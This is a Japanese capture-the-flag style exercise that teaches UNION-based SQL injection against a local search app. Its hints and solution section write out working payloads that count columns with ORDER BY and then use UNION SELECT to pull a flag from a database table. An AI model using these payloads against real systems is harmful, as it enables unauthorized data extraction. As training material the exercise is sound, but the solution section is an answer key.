# 02 - UNION-based Search

`http://localhost:3002` の商品検索から、DB内のflagを抜き出せ。

このDBには`flags`テーブルがあり、`flag`カラムにflagが1件入っている
(`products`テーブルとは無関係)。目標は「UNION SELECTでこの値を検索結果に混ぜ込む」こと。

## ヒント

<details><summary>ヒント1</summary>

`?q=`の値をそのままLIKE句に埋め込んでいる(`server.py`参照)。エラーはそのままJSONで返る
= 構文ミスの手がかりが丸見え。

</details>

<details><summary>ヒント2</summary>

`q=test' ORDER BY 5-- -` のように末尾のカラム数を変えて試すと、存在しないカラム番号で
エラーが出る。これでSELECTしているカラム数がわかる。

</details>

<details><summary>ヒント3</summary>

カラム数がわかったら`UNION SELECT`で`flags.flag`を検索結果に混ぜ込める。型が違うカラムには
`NULL`を入れれば型エラーを回避できる。

</details>

<details><summary>解答</summary>

1. カラム数特定:
   ```
   q=zzz' ORDER BY 4-- -
   ```
   (5にするとエラーになる → 4カラム)

2. UNION成立確認:
   ```
   q=zzz' UNION SELECT 1,'a','b',1-- -
   ```

3. flag抽出:
   ```
   q=zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
   ```

</details>
